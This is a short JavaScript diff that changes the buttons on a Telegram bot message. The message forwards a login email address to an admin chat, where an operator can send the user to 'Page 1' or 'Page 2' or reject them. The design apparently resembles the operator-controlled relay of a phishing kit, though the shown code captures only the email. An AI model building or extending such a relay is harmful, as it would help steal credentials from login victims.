@@ -107,16 +107,18 @@ async function sendLoginTelegram(email) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ page 1", callback_data: `accept|${email}` },
-          { text: "✅ page 2", callback_data: `accept|${email}` },
+          { text: "➡️ Page 1", callback_data: `page1|${email}` },
+          { text: "➡️ Page 2", callback_data: `page2|${email}` },
           { text: "❌ Reject", callback_data: `reject|${email}` }
         ]
       ]
     }
   };
+
   const message = `📧 *Email:* ${email}`;
   await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
+
 
 // -----------------
 // Handle button clicks (merged)
@@ -181,4 +183,5 @@ module.exports = {
   sendApprovalRequestPage,
   sendLoginTelegram
 };
+
 
